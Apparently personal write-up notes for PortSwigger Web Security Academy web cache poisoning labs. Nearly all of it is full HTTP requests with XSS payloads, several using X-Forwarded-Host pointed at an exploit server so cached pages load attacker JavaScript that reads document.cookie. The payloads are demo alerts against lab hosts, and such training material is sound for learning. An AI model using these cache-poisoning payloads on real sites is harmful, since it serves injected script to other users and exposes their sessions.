### Web cache poisoning with an unkeyed header
**Payload**
change the pathfile to `/resources/js/tracking.js` and body in exploit server to:
```http
HTTP/2 200 OK
Content-Type: application/javascript; charset=utf-8
Server: Academy Exploit Server
Content-Length: 44

alert(document.cookie);
```
Poison the cache by adding `X-Forwarded-Host: EXPLOIT-SERVER.com`, so when the usual user go to the page, it will load the https://EXPLOIT-SERVER.com/resources/js/tracking.js that contain command js

### Web cache poisoning with an unkeyed cookie
**Payload** : add cookies `fehost=prod-cache-01"-alert(1)-"ss` on the request, it will bypass js strings on
```js
<script>
    data = {
	    "host":"0a4e006204306afc80da805e007f00ec.web-security-academy.net",
	    "path":"/",
	    "frontend":"prod-cache-01"-alert(1)-"ss"
	    }
</script>
```

### Web cache poisoning with multiple headers
**Payload** :
```http
GET /resources/js/tracking.js HTTP/2
Host: 0a2900d704ec75e280f221cc0082002c.web-security-academy.net
Cookie: session=AHEFVheDyN70StuwUFDHjs5dxT89DpMi
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Dnt: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers
X-Forwarded-Scheme: http
X-Forwarded-Host: exploit-0a43007a04cb7524802e2010012e0085.exploit-server.net
```

### Targeted web cache poisoning using an unknown header
**Flow** :
on home page, go to param miner to guess header -> found out the header `X-Host` is allowed -> send to repeater -> relieaze the url on tracker id has change -> post comment with contain html tag that contain img with source exploit server to see the user agent victim -> change the user agent on repeater to user agent victim
**Payload** : payload same as the first lab

### Web cache poisoning via an unkeyed query string
**Payload**:
```http
GET /?aa=aac'/><script>alert(1)</script> HTTP/2
Host: 0ab4008e03186a1380f3261500730068.web-security-academy.net
Cookie: session=9VwfkEQZdE04XsvT3xft6YxbOCsGoz6A
Cache-Control: max-age=0
Sec-Ch-Ua: "Not.A/Brand";v="99", "Chromium";v="136"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ab4008e03186a1380f3261500730068.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Pragma: x-get-cache-key
Origin: aaaa.web-security-academy.net


```
First, by add `Pragma: x-get-cache-key` to see the which key that will change the -> send to param miner, to detect which header that return on `X-Cache-Key`, that is Origin, than repeat the payload on parameter, until the payload work

### Web cache poisoning via an unkeyed query parameter
**Payload**:
```http
GET /?utm_content=adsfa'/><script>alert(1)</script> HTTP/2
Host: 0ae0000c04a6d422ed0dc972008100b4.web-security-academy.net
Cache-Control: max-age=0
Sec-Ch-Ua: "Not.A/Brand";v="99", "Chromium";v="136"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

### Parameter cloaking
**Payload**:
```http
GET /js/geolocate.js?callback=setCountryCookie&utm_content=w6xdu54ew8;callback=alert(1) HTTP/2
Host: 0a5c00c3042db1bb808e0353009900ea.web-security-academy.net
Cookie: country=[object Object]; session=4FamaroWWmHs7Vd4LiyuuvJDdcZMuZhZ
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not.A/Brand";v="99", "Chromium";v="136"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: script
Referer: https://0a5c00c3042db1bb808e0353009900ea.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=1
Pragma: x-get-cache-key


```
https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws#cache-parameter-cloaking

### Web cache poisoning via a fat GET request
**Payload**:
```http
GET /js/geolocate.js?callback=setCountryCookie HTTP/2
Host: 0aa600be040a763a803f8594000d0003.web-security-academy.net
Cookie: country=[object Object]; session=AmvyOq1TAynaiHwmYcaWvDE7JnXN3NQc
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not.A/Brand";v="99", "Chromium";v="136"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: script
Referer: https://0aa600be040a763a803f8594000d0003.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=1
Content-Length: 19


callback=alert(1)
```

### URL normalization
**Payload** :
```http
GET /sfad</p><script>alert(1)</script> HTTP/2
Host: 0aac00fc04d3a89080b0fd7900580024.web-security-academy.net
Cookie: session=rrWFGIdBkcg1hQabg9NLLi5f7dhFufFx
Cache-Control: max-age=0
Sec-Ch-Ua: "Not.A/Brand";v="99", "Chromium";v="136"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```
```http
POST /deliver-to-victim HTTP/2
Host: 0aac00fc04d3a89080b0fd7900580024.web-security-academy.net
Cookie: session=rrWFGIdBkcg1hQabg9NLLi5f7dhFufFx
Content-Length: 106
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not.A/Brand";v="99", "Chromium";v="136"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: */*
Origin: https://0aac00fc04d3a89080b0fd7900580024.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0aac00fc04d3a89080b0fd7900580024.web-security-academy.net/?constructor[prototype][a42e5579]=kn9wr5x6&constructor.prototype.b1a3fd5b=kn9wr5x6&__proto__.ccd80966=kn9wr5x6&__proto__[dcb52823]=kn9wr5x6&constrconstructoructor[prototype][a55a1ee1]=kn9wr5x6&constrconstructoructor.prototype.b2f55e1f=kn9wr5x6&__pro__proto__to__.eab10255=kn9wr5x6&__pro__proto__to__[f33fdea1]=kn9wr5x6
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

answer=https://0aac00fc04d3a89080b0fd7900580024.web-security-academy.net/sfad</p><script>alert(1)</script>
```

